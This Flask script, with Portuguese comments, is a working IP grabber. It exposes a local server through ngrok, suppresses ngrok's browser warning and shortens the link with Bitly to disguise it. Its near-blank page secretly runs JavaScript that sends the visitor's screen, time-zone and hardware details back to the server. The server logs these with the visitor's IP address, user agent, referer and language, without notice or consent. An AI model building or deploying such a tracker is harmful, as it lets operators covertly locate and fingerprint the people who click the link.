from flask import Flask, request, jsonify
from pyngrok import ngrok
import config as n
import requests
import json
import ipaddress
import datetime
from werkzeug.middleware.proxy_fix import ProxyFix

NGROK_AUTH_TOKEN = n.SECURE
BITLY_API_TOKEN = n.BITLY_TOKEN
PORT = 5000

app = Flask(__name__)

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

@app.before_request
def set_skip_header():
    request.environ['HTTP_NGROK_SKIP_BROWSER_WARNING'] = 'true'

@app.after_request
def skip_warning(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    response.headers["Cache-Control"] = "no-store"
    return response

def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        forwarded_ips = [ip.strip() for ip in request.headers['X-Forwarded-For'].split(',')]
        for ip_candidate in forwarded_ips:
            try:
                if ipaddress.ip_address(ip_candidate).version == 4:
                    return ip_candidate
            except ValueError:
                continue
        if forwarded_ips:
            return forwarded_ips[0]
    return request.remote_addr or '0.0.0.0'

@app.route('/')
def home():
    client_ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'N/A')
    referer = request.headers.get('Referer', 'N/A')
    accept_language = request.headers.get('Accept-Language', 'N/A')

    html_content = f'''
    <html>
    <head>
        <meta charset="utf-8">
        <title>Olá</title>
        <style>
            body {{ font-family: 'Inter', sans-serif; text-align: center; padding-top: 50px; background-color: #f0f0f0; border-radius: 10px; }}
            h1 {{ color: #333; }}
            p {{ color: #666; }}
        </style>
        <script>
            document.addEventListener('DOMContentLoaded', function() {{
                const clientData = {{
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                }};

                fetch('/log_client_data', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify(clientData)
                }})
                .then(response => response.json())
                .then(data => console.log('Dados do cliente enviados:', data))
                .catch((error) => {{
                    console.error('Erro ao enviar dados do cliente:', error);
                }});
            }});
        </script>
    </head>
    <body>
        <h1>Olá!</h1>
        <p>Satanás.</p>
    </body>
    </html>
    '''
    return html_content

@app.route('/log_client_data', methods=['POST'])
def log_client_data():
    try:
        data = request.get_json(force=True) 
        if not data or not isinstance(data, dict):
            return jsonify({"status": "error", "message": "JSON inválido ou vazio"}), 400

        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', 'N/A')
        referer = request.headers.get('Referer', 'N/A')
        accept_language = request.headers.get('Accept-Language', 'N/A')

        log_entry = {
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
            "ip": client_ip,
            "user_agent": user_agent,
            "referer": referer,
            "accept_language": accept_language,
            "client_side_data": data
        }

        sanitized_log = json.dumps(log_entry, ensure_ascii=False)

        with open("access_logs.txt", "a", encoding='utf-8') as f:
            f.write(sanitized_log + "\n")

        return jsonify({"status": "success", "message": "Dados registrados"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": f"Erro interno: {str(e)}"}), 500

if __name__ == "__main__":
    ngrok.set_auth_token(NGROK_AUTH_TOKEN)
    tunnel = ngrok.connect(addr=PORT)
    public_url_ngrok = tunnel.public_url
    print(f"Link público ngrok gerado: {public_url_ngrok}")

    bitly_api_url = "https://api-ssl.bitly.com/v4/shorten"
    headers = {
        "Authorization": f"Bearer {BITLY_API_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {
        "long_url": public_url_ngrok
    }

    try:
        response = requests.post(bitly_api_url, headers=headers, json=payload, timeout=5)
        response.raise_for_status()
        data = response.json()
        short_url = data.get("link")
        if short_url:
            print(f"Link encurtado (Bitly): {short_url}")
        else:
            print(f"Bitly não retornou link válido. Resposta: {data}")
    except Exception as e:
        print(f"Erro ao encurtar link com Bitly: {e}")

    app.run(port=PORT)
